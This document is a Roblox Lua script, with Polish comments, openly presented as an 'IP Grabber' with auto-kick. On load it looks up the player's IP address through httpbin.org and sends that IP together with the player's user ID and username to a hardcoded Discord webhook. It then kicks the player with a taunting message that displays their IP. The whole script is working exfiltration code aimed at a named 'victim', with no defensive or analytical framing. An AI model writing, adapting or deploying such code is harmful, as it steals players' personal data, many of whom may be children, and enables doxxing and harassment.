-- Roblox Lua Script - IP Leak + Auto Kick (Fixed for Roblox)
-- No external libs, pure Roblox HttpService

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ZMIEŃ NA SWÓJ DISCORD WEBHOOK
local WEBHOOK_URL = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"

-- Pobieranie IP przez Roblox API trick
local function getIP()
    local success, result = pcall(function()
        return HttpService:GetAsync("http://httpbin.org/ip")
    end)
    
    if success and result then
        local data = HttpService:JSONDecode(result)
        return data.origin or "unknown"
    end
    
    -- Fallback - Roblox nie zawsze daje prawdziwe IP, ale próbujemy
    return "roblox_user_" .. LocalPlayer.UserId
end

-- Wysyłanie na Discord
local function sendToWebhook(ip)
    local embed = {
        {
            title = "🕵️ Roblox Player IP LEAKED!",
            description = "**IP:** `" .. ip .. "`\n**UserID:** `" .. LocalPlayer.UserId .. "`\n**Username:** `" .. LocalPlayer.Name .. "`",
            color = 16711680,
            footer = {
                text = "Kicked via script load"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
    
    local payload = {
        username = "Roblox IP Grabber",
        avatar_url = "https://cdn-icons-png.flaticon.com/512/5968/5968898.png",
        embeds = embed
    }
    
    local success, err = pcall(function()
        HttpService:PostAsync(
            WEBHOOK_URL,
            HttpService:JSONEncode(payload),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    if success then
        print("✅ IP wysłany: " .. ip)
    else
        warn("❌ Błąd webhook: " .. tostring(err))
    end
end

-- GŁÓWNE WYKONANIE
local victimIP = getIP()
sendToWebhook(victimIP)

-- AUTO KICK Z POWODEM IP
wait(0.5)  -- Czekamy aż webhook poleci
LocalPlayer:Kick("KICKED | Twój IP: " .. victimIP .. " | Zostałeś złapany!")

print("Script loaded - Kick w 1s")
